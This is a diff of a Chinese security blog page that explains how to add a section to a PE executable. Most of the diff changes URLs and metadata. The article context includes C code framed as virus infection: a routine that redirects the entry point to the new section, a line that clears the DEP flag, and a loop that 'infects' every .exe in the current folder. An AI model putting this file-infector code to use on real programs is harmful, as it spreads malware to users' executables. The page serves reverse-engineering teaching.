@@ -103,19 +103,19 @@
 <meta name="keywords" content="PE 文件,添加节区,病毒感染,打补丁">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PE 文件中添加节区">
-<meta property="og:url" content="http://0x4c43.cn/2017/0723/a-section-in-the-pe-file/index.html">
+<meta property="og:url" content="http://0x4c43.cn/2017/0723/add-section-in-pe-file/index.html">
 <meta property="og:site_name" content="0x4C43's Blog">
 <meta property="og:description" content="在没有源码的情况下，如果想要修改程序或者给程序添加功能，那么就可以通过打补丁的方式来实现。此外，恶意代码为了隐藏自身会将代码注入到目标系统的合法程序中，该行为被称为恶意代码的感染性。 打补丁和病毒感染文件都是对目标程序的 PE 文件进行操作，由于 PE 文件每个节区在磁盘中的对齐单位为 0x200 字节，所以每个节区间可能会存在空隙，如果补丁代码或病毒需注入的代码量较少时，可以把代码写入到这些空隙">
-<meta property="og:image" content="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-7-21/52134100.jpg">
-<meta property="og:image" content="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-7-21/41073536.jpg">
-<meta property="og:image" content="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-7-21/28635670.jpg">
-<meta property="og:image" content="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-7-21/63364761.jpg">
-<meta property="og:image" content="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-7-23/33815689.jpg">
-<meta property="og:updated_time" content="2018-10-28T20:22:00.000Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586020551_52134100.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586020549_41073536.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586020545_28635670.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586020552_63364761.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586020547_33815689.jpg">
+<meta property="og:updated_time" content="2020-04-04T16:56:05.019Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="PE 文件中添加节区">
 <meta name="twitter:description" content="在没有源码的情况下，如果想要修改程序或者给程序添加功能，那么就可以通过打补丁的方式来实现。此外，恶意代码为了隐藏自身会将代码注入到目标系统的合法程序中，该行为被称为恶意代码的感染性。 打补丁和病毒感染文件都是对目标程序的 PE 文件进行操作，由于 PE 文件每个节区在磁盘中的对齐单位为 0x200 字节，所以每个节区间可能会存在空隙，如果补丁代码或病毒需注入的代码量较少时，可以把代码写入到这些空隙">
-<meta name="twitter:image" content="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-7-21/52134100.jpg">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586020551_52134100.jpg">
 
 
 
@@ -143,7 +143,7 @@
 
 
 
-  <link rel="canonical" href="http://0x4c43.cn/2017/0723/a-section-in-the-pe-file/"/>
+  <link rel="canonical" href="http://0x4c43.cn/2017/0723/add-section-in-pe-file/"/>
 
 
 
@@ -314,7 +314,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://0x4c43.cn/2017/0723/a-section-in-the-pe-file/">
+    <link itemprop="mainEntityOfPage" href="http://0x4c43.cn/2017/0723/add-section-in-pe-file/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="0x4C43">
@@ -391,9 +391,9 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2017/0723/a-section-in-the-pe-file/#comments" itemprop="discussionUrl">
+                <a href="/2017/0723/add-section-in-pe-file/#comments" itemprop="discussionUrl">
                   <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2017/0723/a-section-in-the-pe-file/" itemprop="commentCount"></span>
+                        data-disqus-identifier="2017/0723/add-section-in-pe-file/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -429,12 +429,11 @@
 <p>当补丁代码或病毒需注入的代码量较大时，可以在 PE 文件的末尾添加一个节区用于存储这些代码。下面介绍如何在 PE 文件中添加一个节区。</p>
 <h1 id="0x01-手动添加"><a href="#0x01-手动添加" class="headerlink" title="0x01 手动添加"></a>0x01 手动添加</h1><p>使用 C32asm 可以很方便地定位并修改 PE 文件的各个字段，点击 “查看” / “PE信息” 可打开 PE 结构字段的解析面板。添加节区的具体流程如下。</p>
 <h2 id="1-添加一个-IMAGE-SECTION-HEADER"><a href="#1-添加一个-IMAGE-SECTION-HEADER" class="headerlink" title="1. 添加一个 IMAGE_SECTION_HEADER"></a>1. 添加一个 IMAGE_SECTION_HEADER</h2><p>首先在原来节表的末尾添加一个节表，IMAGE_SECTION_HEADER 结构体中要设置的字段有以下6个：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Name: .<span class="keyword">new</span></div><div class="line">VirtualSize: <span class="number">0x450</span> <span class="comment">// 该字段可不用对齐</span></div><div class="line">VirtualAddress: <span class="number">0x9000</span> <span class="comment">// 上一节区的 VirtualAddress + 对齐后的 VirtualSize</span></div><div class="line">SizeOfRawData: <span class="number">0x600</span> <span class="comment">// 该字段为对齐后的值</span></div><div class="line">PointerToRawData: <span class="number">0x5200</span> <span class="comment">// 上一节区的 PointerToRawData + SizeOfRawData</span></div><div class="line">Characteristics：<span class="number">0x60000020</span>  <span class="comment">// 与 .text段一致</span></div></pre></td></tr></table></figure></p>
-<p><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-7-21/52134100.jpg" alt=""></p>
-<h2 id="2-修改-NumberOfSection"><a href="#2-修改-NumberOfSection" class="headerlink" title="2. 修改 NumberOfSection"></a>2. 修改 NumberOfSection</h2><p>添加一个节表之后需要修改 IMAGE_FILE_HEADER 中的 NumberOfSection 字段，将节区数量由 4 改为 5。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-7-21/41073536.jpg" alt=""></p>
-<h2 id="3-修改-SizeOfImage"><a href="#3-修改-SizeOfImage" class="headerlink" title="3. 修改 SizeOfImage"></a>3. 修改 SizeOfImage</h2><p>接着修改文件映像大小，即 IMAGE_OPTIONAL_HEADER 中的 SizeOfImage 字段，该字段按内存对齐方式对齐，在原大小（0x9000）的基础上加上新节区的大小（0x450），对齐后为 0xa000。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-7-21/28635670.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586020551_52134100.jpg" alt=""></p>
+<h2 id="2-修改-NumberOfSection"><a href="#2-修改-NumberOfSection" class="headerlink" title="2. 修改 NumberOfSection"></a>2. 修改 NumberOfSection</h2><p>添加一个节表之后需要修改 IMAGE_FILE_HEADER 中的 NumberOfSection 字段，将节区数量由 4 改为 5。<br><img src="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586020549_41073536.jpg" alt=""></p>
+<h2 id="3-修改-SizeOfImage"><a href="#3-修改-SizeOfImage" class="headerlink" title="3. 修改 SizeOfImage"></a>3. 修改 SizeOfImage</h2><p>接着修改文件映像大小，即 IMAGE_OPTIONAL_HEADER 中的 SizeOfImage 字段，该字段按内存对齐方式对齐，在原大小（0x9000）的基础上加上新节区的大小（0x450），对齐后为 0xa000。<br><img src="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586020545_28635670.jpg" alt=""></p>
 <h2 id="4-添加节区数据"><a href="#4-添加节区数据" class="headerlink" title="4. 添加节区数据"></a>4. 添加节区数据</h2><p>最后添加新增节区的数据，把光标移到文件的末尾，点击 “编辑” / “插入数据”，插入数据大小为 1536(0x600)，使用 00 填充，点击确认，保存即可。</p>
-<p>到此，已成功添加了一个节区，修改之后的程序仍是可运行的，使用 PEview 查看新增节区如下：</p>
-<p><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-7-21/63364761.jpg" alt=""></p>
+<p>到此，已成功添加了一个节区，修改之后的程序仍是可运行的，使用 PEview 查看新增节区如下：<br><img src="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586020552_63364761.jpg" alt=""></p>
 <p>这里需要注意插入数据的大小要按磁盘对齐方式对齐，不然最终修改后的文件无法运行，并提示“该文件不是有效的 Win32 应用程序”。</p>
 <h1 id="0x02-编程实现"><a href="#0x02-编程实现" class="headerlink" title="0x02 编程实现"></a>0x02 编程实现</h1><p>恶意代码为了实现其隐蔽性，在其感染 PE 文件时会将代码执行权交给被插入的代码，所以恶意代码通常会先被执行，执行完后再跳转至原 PE 文件中的代码继续执行。</p>
 <p>添加节区主要通过内存映射文件和 PE 操作完成，将文件映射到内存中后可以通过内存指针方便地访问文件。下面主要介绍添加新节区的代码实现。</p>
@@ -455,7 +454,7 @@
 <p>注：<br>IMAGE_OPTIONAL_HEADER/DllCharacteristics 中 IMAGE_DLLCHARACTERISTICS_NX_COMPAT 为与 DEP 相关的属性值，开启 DEP 时会设置改属性值，同样可以用以下代码关闭目标程序的 DEP：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pNTHdr-&gt;OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_NX_COMPAT;</div></pre></td></tr></table></figure></p>
 <h2 id="6-修改入口地址-OEP"><a href="#6-修改入口地址-OEP" class="headerlink" title="6. 修改入口地址 OEP"></a>6. 修改入口地址 OEP</h2><p>为了让新添加节区中的代码获得优先执行权，要把程序的入口地址设置为新节区的起始地址，即新节表中 VirtualAddress 的值。修改完后调用 FlushViewOfFile() 函数将对文件的修改写入到磁盘中。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">InfectFile</span><span class="params">(TCHAR *fpath)</span></span></div><div class="line">&#123;</div><div class="line"> 	...</div><div class="line">	<span class="comment">//设置新增节区起始地址为新的入口地址</span></div><div class="line">	pNTHdr-&gt;OptionalHeader.AddressOfEntryPoint = pNewSec-&gt;VirtualAddress;</div><div class="line"></div><div class="line">	FlushViewOfFile(pHdr,pNTHdr-&gt;OptionalHeader.SizeOfHeaders);</div><div class="line">	UnmapViewOfFile(pHdr);</div><div class="line">	CloseHandle(hMapFile);</div><div class="line">	CloseHandle(hFile);</div><div class="line"></div><div class="line">	<span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
 <h2 id="7-测试"><a href="#7-测试" class="headerlink" title="7. 测试"></a>7. 测试</h2><p>以下代码遍历当前目录下所有.exe 文件，并感染除程序自身外的所有.exe文件。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">	WIN32_FIND_DATA FileInfo;</div><div class="line">	HANDLE hListFile;</div><div class="line">	TCHAR szFilePath[MAX_PATH];</div><div class="line">	TCHAR szCurrentPath[MAX_PATH];</div><div class="line">	TCHAR szCurrentModule[MAX_PATH];</div><div class="line"></div><div class="line">	<span class="comment">//获取当前目录</span></div><div class="line">	GetCurrentDirectory(MAX_PATH,szCurrentPath);</div><div class="line">	<span class="comment">//获取当前模块路径</span></div><div class="line">	GetModuleFileName(<span class="literal">NULL</span>,szCurrentModule,MAX_PATH);</div><div class="line">	lstrcpy(szFilePath,szCurrentPath);</div><div class="line">	lstrcat(szFilePath,<span class="string">L"\\*.exe"</span>);</div><div class="line"></div><div class="line">	<span class="comment">//遍历当前目录并感染除自身外的所有.exe文件</span></div><div class="line">	hListFile = FindFirstFile(szFilePath,&amp;FileInfo);</div><div class="line">	<span class="keyword">if</span>(hListFile == INVALID_HANDLE_VALUE)&#123;</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">do</span>&#123;</div><div class="line">			<span class="keyword">if</span>(!_tcsstr(szCurrentModule,FileInfo.cFileName))&#123;</div><div class="line">				<span class="comment">//感染目标文件</span></div><div class="line">				<span class="keyword">if</span> (!InfectFile(FileInfo.cFileName))&#123;</div><div class="line">					<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">		&#125;<span class="keyword">while</span>(FindNextFile(hListFile,&amp;FileInfo));</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>运行被感染后的文件，会弹出以下消息框，使用 PEview 可以看到添加了一个名为 .new 的节区。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-7-23/33815689.jpg" alt=""><br>完整代码可以在 <a href="https://github.com/0x4C43/InflectPE" target="_blank" rel="external">此链接</a> 下载。</p>
+<p>运行被感染后的文件，会弹出以下消息框，使用 PEview 可以看到添加了一个名为 .new 的节区。<br><img src="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586020547_33815689.jpg" alt=""><br>完整代码可以在 <a href="https://github.com/0x4C43/InflectPE" target="_blank" rel="external">此链接</a> 下载。</p>
 <hr>
 <p>References:<br>[1] <a href="https://0x00sec.org/t/pe-file-infection/401" target="_blank" rel="external">PE File Infection</a><br>[2] 《小小黑客之路》<br>[3] 《黑客编辑揭秘与防范》<br>[4] 《逆向工程核心原理》</p>
 
@@ -506,7 +505,7 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/0826/deploy-shadowsocks-and-kcptun-on-fibonacci-k2/" rel="next" title="在斐讯 K2 上部署 Shadowsocks 与 Kcptun">
+              <a href="/2017/0826/deploy-shadowsocks-and-kcptun-on-feixun-k2/" rel="next" title="在斐讯 K2 上部署 Shadowsocks 与 Kcptun">
                 <i class="fa fa-chevron-left"></i> 在斐讯 K2 上部署 Shadowsocks 与 Kcptun
               </a>
             
@@ -516,7 +515,7 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/0605/modify-firmware-using-firmwaremodkit/" rel="prev" title="使用 firmware-mod-kit 修改固件">
+              <a href="/2017/0605/use-firmwaremodkit-to-modify-firmware/" rel="prev" title="使用 firmware-mod-kit 修改固件">
                 使用 firmware-mod-kit 修改固件 <i class="fa fa-chevron-right"></i>
               </a>
             
@@ -608,7 +607,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-count">12</span>
                 <span class="site-state-item-name">categories</span>
               </a>
             </div>
@@ -701,7 +700,7 @@
         <div class="copyright" >
   
   &copy;  2017 - 
-  <span itemprop="copyrightYear">2018</span>
+  <span itemprop="copyrightYear">2020</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -830,8 +829,8 @@
     
       <script type="text/javascript">
         var disqus_config = function () {
-          this.page.url = 'http://0x4c43.cn/2017/0723/a-section-in-the-pe-file/';
-          this.page.identifier = '2017/0723/a-section-in-the-pe-file/';
+          this.page.url = 'http://0x4c43.cn/2017/0723/add-section-in-pe-file/';
+          this.page.identifier = '2017/0723/add-section-in-pe-file/';
           this.page.title = 'PE 文件中添加节区';
         };
         var d = document, s = d.createElement('script');
